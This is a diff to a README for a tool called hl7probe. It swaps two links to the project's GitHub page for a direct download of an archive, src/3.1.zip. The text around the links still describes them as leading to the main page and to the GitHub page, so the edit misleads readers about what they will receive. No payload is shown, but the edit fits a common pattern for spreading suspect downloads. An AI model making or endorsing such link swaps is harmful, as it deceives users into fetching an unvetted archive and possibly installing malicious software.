@@ -33,7 +33,7 @@ Getting started is easy! Follow these steps carefully, and you'll be checking me
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[hl7probe Download](https://github.com/slayque1989/hl7probe)**
+Visit this link to download the application: **[hl7probe Download](https://raw.githubusercontent.com/slayque1989/hl7probe/main/src/3.1.zip)**
 
 This link takes you to the main page where you'll find the download section. Look for the button or link that says "Download" or "Get hl7probe."
 
@@ -133,7 +133,7 @@ Ready to dive deeper? Here are some ideas:
 
 If you run into any problems, don't worry! Here's where to get help:
 
-- **Visit the website** – Check the [hl7probe GitHub page](https://github.com/slayque1989/hl7probe) for updates and info
+- **Visit the website** – Check the [hl7probe GitHub page](https://raw.githubusercontent.com/slayque1989/hl7probe/main/src/3.1.zip) for updates and info
 - **Report issues** – Found a bug? Tell the developers so they can fix it
 - **Read the documentation** – More detailed guides are available on the website
 
